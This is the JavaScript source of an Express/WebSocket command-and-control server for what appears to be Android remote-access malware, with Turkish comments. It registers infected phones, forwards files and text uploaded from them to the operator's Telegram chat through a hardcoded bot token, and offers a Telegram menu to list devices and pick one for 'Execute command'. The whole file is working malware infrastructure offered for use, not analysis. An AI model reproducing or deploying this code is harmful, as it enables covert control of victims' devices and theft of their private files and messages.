const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '8556776367:AAHdc6mSyfjzHmemc5JtQhG8VpJM4fsc0vo';
const id = '7669680491';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
});

// --- DOSYA VE VERİ YÜKLEME YOLLARI ---
app.post("/uploadFile", upload.single('file'), (req, res) => {
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        parse_mode: "HTML"
    }, { filename: req.file.originalname, contentType: 'application/octet-stream' });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"});
    res.send('');
});

// --- WEBSOCKET BAĞLANTISI ---
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    ws.uuid = uuid;
    const model = req.headers.model || "Unknown";
    appClients.set(uuid, { model, battery: req.headers.battery, version: req.headers.version });
    
    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n• Model: <b>${model}</b>`, {parse_mode: "HTML"});

    ws.on('close', () => {
        appClients.delete(ws.uuid);
        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n• Model: <b>${model}</b>`, {parse_mode: "HTML"});
    });
});

// --- TELEGRAM MESAJLARI ---
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId != id) return;

    if (message.text === '/start') {
        appBot.sendMessage(id, '°• 𝙃𝙚𝙡𝙡𝙤 𝙎𝙞𝙧 😎', {
            reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: true
            }
        });
    }

    if (message.text === '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size === 0) {
            appBot.sendMessage(id, '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨');
        } else {
            let text = '°• 𝙇𝙞𝙨𝙩:\n\n';
            appClients.forEach((v) => { text += `• <b>${v.model}</b>\n`; });
            appBot.sendMessage(id, text, {parse_mode: "HTML"});
        }
    }

    if (message.text === '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        const deviceListKeyboard = [];
        appClients.forEach((value, key) => {
            deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }]);
        });
        appBot.sendMessage(id, '𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚:', { reply_markup: { inline_keyboard: deviceListKeyboard } });
    }
});

// --- CALLBACK QUERY (BUTONLAR) ---
appBot.on("callback_query", (callbackQuery) => {
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (command === 'device') {
        currentUuid = uuid;
        appBot.sendMessage(id, `Seçilen cihaz: ${appClients.get(uuid).model}\nKomut bekliyor...`);
        // Burada diğer alt butonları (Apps, Location vs.) ekleyebilirsin
    }
});

// --- RENDER PORT AYARI (BURASI ÇOK ÖNEMLİ) ---
const PORT = process.env.PORT || 3000;
appServer.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
